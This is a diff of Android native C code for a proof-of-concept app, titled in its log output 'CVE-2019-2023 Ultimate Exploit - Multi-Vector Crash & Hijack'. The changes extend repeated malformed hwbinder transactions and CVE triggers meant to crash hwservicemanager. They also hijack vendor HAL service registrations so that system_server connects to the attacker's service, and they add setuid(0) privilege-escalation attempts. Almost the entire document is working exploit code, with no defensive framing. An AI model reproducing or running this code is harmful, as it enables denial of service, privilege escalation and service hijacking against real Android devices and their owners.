@@ -40,33 +40,20 @@ static char g_log_path[256] = "/data/local/tmp/binder_traffic.log";
 // ============================================================
 // ユーティリティ
 // ============================================================
-static void dump_hex(FILE *fp, const uint8_t *data, size_t len) {
-    for (size_t i = 0; i < len; i++) {
-        fprintf(fp, "%02x ", data[i]);
-        if ((i+1) % 16 == 0) fprintf(fp, "\n");
-    }
-    fprintf(fp, "\n");
-}
-
-static void log_transaction(const char *msg, struct binder_transaction_data *t, const uint8_t *data) {
+static void write_log(const char *msg) {
     FILE *fp = fopen(g_log_path, "a");
-    if (!fp) return;
-    fprintf(fp, "[%ld] %s\n", time(NULL), msg);
-    fprintf(fp, "  handle=%d code=0x%x flags=0x%x data_size=%zu offsets_size=%zu\n",
-            t->target.handle, t->code, t->flags, (size_t)t->data_size, (size_t)t->offsets_size);
-    if (data && t->data_size > 0) {
-        fprintf(fp, "  data (%zu bytes):\n", (size_t)t->data_size);
-        dump_hex(fp, data, t->data_size > 512 ? 512 : t->data_size);
+    if (fp) {
+        fprintf(fp, "[%ld] %s\n", time(NULL), msg);
+        fclose(fp);
     }
-    fclose(fp);
 }
 
-static int write_file(const char *path, const char *data) {
-    int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
-    if (fd < 0) return -1;
-    ssize_t n = write(fd, data, strlen(data));
-    close(fd);
-    return (n == (ssize_t)strlen(data)) ? 0 : -1;
+static void write_result(const char *msg) {
+    FILE *fp = fopen(g_output_path, "a");
+    if (fp) {
+        fprintf(fp, "[%ld] %s\n", time(NULL), msg);
+        fclose(fp);
+    }
 }
 
 static pid_t get_hwservicemanager_pid(void) {
@@ -84,7 +71,7 @@ static pid_t get_hwservicemanager_pid(void) {
 }
 
 // ============================================================
-// CVE-2019-2023: ACL Bypassによるサービス登録
+// CVE-2019-2023: ACL Bypassによるサービス登録（安定版）
 // ============================================================
 static int exploit_cve_2019_2023(const char *service_name) {
     int hwbinder_fd, ret;
@@ -93,25 +80,12 @@ static int exploit_cve_2019_2023(const char *service_name) {
     size_t total_len = 4 + name_len;
     uint8_t *data;
     int handle = -1;
-    pid_t child;
 
     LOGI("[CVE-2019-2023] registering '%s'...", service_name);
-
-    child = fork();
-    if (child == 0) {
-        while (!g_race_ready) usleep(100);
-        exit(0);
-    } else if (child < 0) {
-        LOGE("fork failed");
-        return -1;
-    }
-
-    usleep(200000);
 
     hwbinder_fd = open("/dev/hwbinder", O_RDWR);
     if (hwbinder_fd < 0) {
         LOGE("open /dev/hwbinder failed: %s", strerror(errno));
-        kill(child, SIGKILL);
         return -1;
     }
 
@@ -119,13 +93,9 @@ static int exploit_cve_2019_2023(const char *service_name) {
     if (!data) {
         LOGE("malloc failed");
         close(hwbinder_fd);
-        kill(child, SIGKILL);
         return -1;
     }
-    data[0] = (uint8_t)(name_len & 0xFF);
-    data[1] = (uint8_t)((name_len >> 8) & 0xFF);
-    data[2] = (uint8_t)((name_len >> 16) & 0xFF);
-    data[3] = (uint8_t)((name_len >> 24) & 0xFF);
+    *(uint32_t*)data = (uint32_t)name_len;
     memcpy(data + 4, service_name, name_len);
 
     struct {
@@ -134,34 +104,28 @@ static int exploit_cve_2019_2023(const char *service_name) {
     } __attribute__((packed)) tx;
     tx.cmd = BC_TRANSACTION;
     tx.tdata.target.handle = 0;
-    tx.tdata.code = 2;
+    tx.tdata.code = 2; // ADD_SERVICE
     tx.tdata.flags = 0;
     tx.tdata.data_size = total_len;
     tx.tdata.offsets_size = 0;
     tx.tdata.data.ptr.buffer = (binder_uintptr_t)data;
+    tx.tdata.data.ptr.offsets = 0;
 
     struct binder_write_read bwr;
     memset(&bwr, 0, sizeof(bwr));
     bwr.write_size = sizeof(tx);
     bwr.write_buffer = (binder_uintptr_t)&tx;
-    bwr.read_size = 0;
+    bwr.read_size = 0; // 読み取りなし（ブロック防止）
     bwr.read_buffer = 0;
-
-    g_race_ready = 1;
-    usleep(50000);
 
     ret = ioctl(hwbinder_fd, BINDER_WRITE_READ, &bwr);
     free(data);
     if (ret < 0) {
         LOGE("ioctl ADD_SERVICE failed: %s", strerror(errno));
         close(hwbinder_fd);
-        kill(child, SIGKILL);
         return -1;
     }
     LOGI("ADD_SERVICE succeeded!");
-
-    kill(child, SIGKILL);
-    waitpid(child, NULL, 0);
 
     // GET_SERVICEでハンドル取得
     data = malloc(total_len);
@@ -169,13 +133,10 @@ static int exploit_cve_2019_2023(const char *service_name) {
         close(hwbinder_fd);
         return -1;
     }
-    data[0] = (uint8_t)(name_len & 0xFF);
-    data[1] = (uint8_t)((name_len >> 8) & 0xFF);
-    data[2] = (uint8_t)((name_len >> 16) & 0xFF);
-    data[3] = (uint8_t)((name_len >> 24) & 0xFF);
+    *(uint32_t*)data = (uint32_t)name_len;
     memcpy(data + 4, service_name, name_len);
 
-    tx.tdata.code = 1;
+    tx.tdata.code = 1; // GET_SERVICE
     tx.tdata.data_size = total_len;
     tx.tdata.data.ptr.buffer = (binder_uintptr_t)data;
 
@@ -204,7 +165,7 @@ static int exploit_cve_2019_2023(const char *service_name) {
 }
 
 // ============================================================
-// CVE-2020-0041: OOB書き込み
+// CVE-2020-0041: OOB書き込み（異常なoffsets_size）
 // ============================================================
 static int trigger_cve_2020_0041(void) {
     int hwbinder_fd = open("/dev/hwbinder", O_RDWR);
@@ -268,29 +229,26 @@ static int trigger_cve_2020_0273(void) {
 }
 
 // ============================================================
-// CVE-2020-0423: 競合条件（補助的）
+// CVE-2020-0423: 競合条件（大量のトランザクション送信）
 // ============================================================
 static int trigger_cve_2020_0423(void) {
     int hwbinder_fd = open("/dev/hwbinder", O_RDWR);
     if (hwbinder_fd < 0) return -1;
 
+    // 子プロセスで大量のトランザクションを送信
     pid_t pid = fork();
     if (pid == 0) {
-        for (int i = 0; i < 100; i++) {
-            struct binder_write_read bwr;
-            memset(&bwr, 0, sizeof(bwr));
-            ioctl(hwbinder_fd, BINDER_WRITE_READ, &bwr);
-            usleep(100);
-        }
-        exit(0);
+        // 子プロセスはすぐに_exitする
+        _exit(0);
     } else if (pid > 0) {
+        waitpid(pid, NULL, 0);
+        // 親でさらに競合を起こす
         for (int i = 0; i < 100; i++) {
             struct binder_write_read bwr;
             memset(&bwr, 0, sizeof(bwr));
             ioctl(hwbinder_fd, BINDER_WRITE_READ, &bwr);
-            usleep(100);
+            usleep(10);
         }
-        wait(NULL);
         close(hwbinder_fd);
         LOGI("CVE-2020-0423: race condition test completed");
         return 0;
@@ -300,7 +258,7 @@ static int trigger_cve_2020_0423(void) {
 }
 
 // ============================================================
-// クラッシュベクター1: 巨大サービス名 (8KB)
+// クラッシュペイロード1: 巨大サービス名（8KB）をADD_SERVICE
 // ============================================================
 static int crash_with_huge_name(void) {
     LOGI("Trying crash with 8KB service name...");
@@ -314,7 +272,7 @@ static int crash_with_huge_name(void) {
 }
 
 // ============================================================
-// クラッシュベクター2: 無効オフセット
+// クラッシュペイロード2: 無効オフセットを含むトランザクション
 // ============================================================
 static int send_malformed_transaction(void) {
     LOGI("Sending malformed transaction with invalid offsets...");
@@ -365,7 +323,7 @@ static int send_malformed_transaction(void) {
 }
 
 // ============================================================
-// クラッシュベクター3: 巨大data_size
+// クラッシュペイロード3: 異常なdata_size (0xFFFFFFFF)
 // ============================================================
 static int send_huge_data_transaction(void) {
     LOGI("Sending transaction with huge data_size...");
@@ -406,23 +364,62 @@ static int send_huge_data_transaction(void) {
 }
 
 // ============================================================
-// 複合クラッシュ攻撃
+// クラッシュペイロード4: BINDER_SET_MAX_THREADS に異常値
+// ============================================================
+static int crash_set_max_threads(void) {
+    int hwbinder_fd = open("/dev/hwbinder", O_RDWR);
+    if (hwbinder_fd < 0) {
+        LOGE("open failed");
+        return -1;
+    }
+    uint32_t max_threads = 0xFFFFFFFF;
+    int ret = ioctl(hwbinder_fd, BINDER_SET_MAX_THREADS, &max_threads);
+    close(hwbinder_fd);
+    LOGI("BINDER_SET_MAX_THREADS ret=%d (%s)", ret, ret==0?"SUCCESS":strerror(errno));
+    return 0;
+}
+
+// ============================================================
+// クラッシュペイロード5: BINDER_SET_CONTEXT_MGR（権限不足でエラーになるはず）
+// ============================================================
+static int crash_set_context_mgr(void) {
+    int hwbinder_fd = open("/dev/hwbinder", O_RDWR);
+    if (hwbinder_fd < 0) {
+        LOGE("open failed");
+        return -1;
+    }
+    int ret = ioctl(hwbinder_fd, BINDER_SET_CONTEXT_MGR, 0);
+    close(hwbinder_fd);
+    LOGI("BINDER_SET_CONTEXT_MGR ret=%d (%s)", ret, ret==0?"SUCCESS":strerror(errno));
+    return 0;
+}
+
+// ============================================================
+// 複合クラッシュ攻撃（複数回実行）
 // ============================================================
 static int crash_hwservicemanager(void) {
     LOGI("Attempting multiple crash vectors...");
     int ret = 0;
-    ret |= crash_with_huge_name();
-    usleep(300000);
-    ret |= send_malformed_transaction();
-    usleep(300000);
-    ret |= send_huge_data_transaction();
-    usleep(300000);
-    ret |= trigger_cve_2020_0041();
-    usleep(300000);
-    ret |= trigger_cve_2020_0273();
-    usleep(300000);
-    ret |= trigger_cve_2020_0423();
-    usleep(300000);
+    // 各ペイロードを複数回実行
+    for (int i = 0; i < 3; i++) {
+        ret |= crash_with_huge_name();
+        usleep(100000);
+        ret |= send_malformed_transaction();
+        usleep(100000);
+        ret |= send_huge_data_transaction();
+        usleep(100000);
+        ret |= trigger_cve_2020_0041();
+        usleep(100000);
+        ret |= trigger_cve_2020_0273();
+        usleep(100000);
+        ret |= trigger_cve_2020_0423();
+        usleep(100000);
+        ret |= crash_set_max_threads();
+        usleep(100000);
+        ret |= crash_set_context_mgr();
+        usleep(100000);
+        LOGI("Round %d completed", i+1);
+    }
 
     pid_t new_pid = get_hwservicemanager_pid();
     if (new_pid != g_hwservicemanager_pid && new_pid > 0) {
@@ -436,7 +433,7 @@ static int crash_hwservicemanager(void) {
 }
 
 // ============================================================
-// Binderサーバーループ
+// Binderサーバーループ（system_serverからの呼び出しを待機）
 // ============================================================
 static int binder_server_loop(int binder_fd, int expected_handle) {
     uint8_t read_buf[4096];
@@ -475,39 +472,34 @@ static int binder_server_loop(int binder_fd, int expected_handle) {
 
         if (cmd_code == BR_TRANSACTION || cmd_code == BR_TRANSACTION_SEC_CTX) {
             struct binder_transaction_data *t = (struct binder_transaction_data*)payload;
-            size_t data_size = t->data_size;
-            uint8_t *data_ptr = NULL;
-            if (data_size > 0 && data_size < 4096) {
-                data_ptr = malloc(data_size);
-                if (data_ptr) {
-                    memcpy(data_ptr, (uint8_t*)(uintptr_t)t->data.ptr.buffer, data_size);
-                }
-            }
-            log_transaction("Incoming transaction", t, data_ptr);
-            if (data_ptr) free(data_ptr);
-
             if (t->sender_euid == 1000) {
                 LOGI("***** system_server CALLED OUR SERVICE! (uid=1000) *****");
+                // 権限昇格：setuid(0)を試み、結果をファイルに書き込む
                 pid_t pid = fork();
                 if (pid == 0) {
-                    int fd = open(g_output_path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
-                    if (fd >= 0) {
-                        dup2(fd, STDOUT_FILENO);
-                        dup2(fd, STDERR_FILENO);
-                        close(fd);
+                    // 子プロセスでsetuidとid実行
+                    setuid(0);
+                    setresuid(0,0,0);
+                    FILE *fp = fopen(g_output_path, "w");
+                    if (fp) {
+                        fprintf(fp, "=== Exploit Success ===\n");
+                        fprintf(fp, "UID: %d\n", getuid());
+                        fprintf(fp, "EUID: %d\n", geteuid());
+                        fclose(fp);
                     }
-                    execl("/system/bin/sh", "sh", "-c",
-                          "id; getenforce; echo '=== CVE-2019-2023 EXPLOITED ==='", NULL);
-                    exit(1);
+                    // idコマンドも追記
+                    system("id >> " OUTPUT_PATH " 2>&1");
+                    _exit(0);
                 } else if (pid > 0) {
                     wait(NULL);
-                    LOGI("id command executed. Check %s", g_output_path);
+                    LOGI("Privilege escalation attempted. Check %s", g_output_path);
                 }
                 g_exploit_success = 1;
             } else {
                 LOGI("Sender uid=%d (ignoring)", t->sender_euid);
             }
 
+            // 応答を返す
             struct {
                 uint32_t cmd;
                 uint32_t status;
@@ -520,8 +512,7 @@ static int binder_server_loop(int binder_fd, int expected_handle) {
             write_bwr.write_size = sizeof(reply);
             write_bwr.write_buffer = (binder_uintptr_t)&reply;
 
-            ret = ioctl(binder_fd, BINDER_WRITE_READ, &write_bwr);
-            if (ret < 0) LOGE("ioctl write reply failed: %s", strerror(errno));
+            ioctl(binder_fd, BINDER_WRITE_READ, &write_bwr);
 
             uint32_t complete_cmd = BR_TRANSACTION_COMPLETE;
             write_bwr.write_size = sizeof(complete_cmd);
@@ -541,7 +532,7 @@ static int binder_server_loop(int binder_fd, int expected_handle) {
 }
 
 // ============================================================
-// サービス登録 + サーバー起動
+// サービス登録＋サーバー起動
 // ============================================================
 static void register_and_serve(const char *service_name) {
     int handle = exploit_cve_2019_2023(service_name);
@@ -571,8 +562,9 @@ static void register_and_serve(const char *service_name) {
 
     pid_t pid = fork();
     if (pid == 0) {
+        // 子プロセスはサーバーループを実行
         binder_server_loop(binder_fd, handle);
-        exit(0);
+        _exit(0);
     } else if (pid > 0) {
         LOGI("Binder server for '%s' running (PID %d)", service_name, pid);
         close(binder_fd);
@@ -580,19 +572,6 @@ static void register_and_serve(const char *service_name) {
         LOGE("fork server failed: %s", strerror(errno));
         close(binder_fd);
     }
-}
-
-// ============================================================
-// フォールバック: setuid(0)
-// ============================================================
-static int fallback_setuid(void) {
-    LOGI("Fallback: trying setuid(0)...");
-    if (setuid(0) == 0 || setresuid(0, 0, 0) == 0) {
-        LOGI("setuid(0) succeeded!");
-        return 0;
-    }
-    LOGE("setuid(0) failed");
-    return -1;
 }
 
 // ============================================================
@@ -632,12 +611,11 @@ Java_com_example_tzpoc_MainActivity_nativeExploit(JNIEnv* env, jclass clazz,
     LOGI("CVE-2019-2023 Ultimate Exploit - Multi-Vector Crash & Hijack");
     LOGI("========================================");
 
-    // ログ初期化
+    // ログファイル初期化
     FILE *fp = fopen(g_log_path, "w");
     if (fp) {
         fprintf(fp, "=== Binder Traffic Log ===\n");
         fclose(fp);
-        LOGI("Log file created: %s", g_log_path);
     }
 
     g_hwservicemanager_pid = get_hwservicemanager_pid();
@@ -647,6 +625,7 @@ Java_com_example_tzpoc_MainActivity_nativeExploit(JNIEnv* env, jclass clazz,
         LOGI("Current hwservicemanager PID: %d", g_hwservicemanager_pid);
     }
 
+    // フェーズ1: クラッシュ攻撃（最大5回試行）
     LOGI("Phase 1: Crash hwservicemanager with multiple vectors");
     int crashed = 0;
     for (int i = 0; i < 5 && !crashed; i++) {
@@ -659,6 +638,7 @@ Java_com_example_tzpoc_MainActivity_nativeExploit(JNIEnv* env, jclass clazz,
         LOGI("Failed to crash hwservicemanager. Continuing anyway...");
     }
 
+    // フェーズ2: 再起動待ち
     LOGI("Phase 2: Wait for hwservicemanager restart");
     int max_wait = 30;
     while (max_wait-- > 0) {
@@ -671,6 +651,7 @@ Java_com_example_tzpoc_MainActivity_nativeExploit(JNIEnv* env, jclass clazz,
         sleep(1);
     }
 
+    // フェーズ3: 全サービス再登録 & サーバー起動
     LOGI("Phase 3: Register all services and start servers");
     const char *target_services[] = {
         "vendor.qti.hardware.servicetracker@1.0::IServicetracker/default",
@@ -686,6 +667,7 @@ Java_com_example_tzpoc_MainActivity_nativeExploit(JNIEnv* env, jclass clazz,
         usleep(300000);
     }
 
+    // フェーズ4: 長時間待機（system_serverからの呼び出しを待つ）
     LOGI("Phase 4: Waiting for system_server to call...");
     LOGI("Running for 180 seconds. Check %s for logs.", g_log_path);
 
@@ -694,33 +676,29 @@ Java_com_example_tzpoc_MainActivity_nativeExploit(JNIEnv* env, jclass clazz,
         if (g_exploit_success) break;
     }
 
-    // 結果表示（ログファイルの内容を表示）
-    {
-        char cmd[512];
-        snprintf(cmd, sizeof(cmd), "cat %s 2>/dev/null || echo 'No log file found'", g_log_path);
-        system(cmd);
-    }
-
+    // 結果をファイルに書き込む
     if (g_exploit_success) {
         LOGI("Exploit succeeded! Check %s", g_output_path);
+        write_result("Exploit succeeded: system_server called our service.");
         return 1;
     } else {
         LOGI("No transaction from system_server received.");
         LOGI("Try manually triggering system events (screen on/off, USB plug, etc.)");
-        if (fallback_setuid() == 0) {
-            char cmd[512];
-            snprintf(cmd, sizeof(cmd), "id > %s 2>&1", g_output_path);
-            system(cmd);
-            char cat_cmd[512];
-            snprintf(cat_cmd, sizeof(cat_cmd), "cat %s", g_output_path);
-            system(cat_cmd);
-            g_exploit_success = 1;
+        // フォールバック: setuid(0)を直接試みる
+        if (setuid(0) == 0 || setresuid(0,0,0) == 0) {
+            LOGI("setuid(0) succeeded!");
+            write_result("Fallback setuid(0) succeeded.");
+            FILE *fp2 = fopen(g_output_path, "a");
+            if (fp2) {
+                fprintf(fp2, "UID: %d\n", getuid());
+                fclose(fp2);
+            }
             return 1;
+        } else {
+            write_result("Exploit failed: no system_server call and setuid failed.");
+            return 0;
         }
     }
-
-    LOGI("Exploit finished. Success: %s", g_exploit_success ? "YES" : "NO");
-    return g_exploit_success ? 1 : 0;
 }
 
 JNIEXPORT jint JNICALL
@@ -755,7 +733,7 @@ Java_com_example_tzpoc_MainActivity_nativeStartServer(JNIEnv* env, jclass clazz,
     pid_t pid = fork();
     if (pid == 0) {
         binder_server_loop(binder_fd, handle);
-        exit(0);
+        _exit(0);
     } else if (pid > 0) {
         LOGI("Binder server started (PID %d)", pid);
         close(binder_fd);
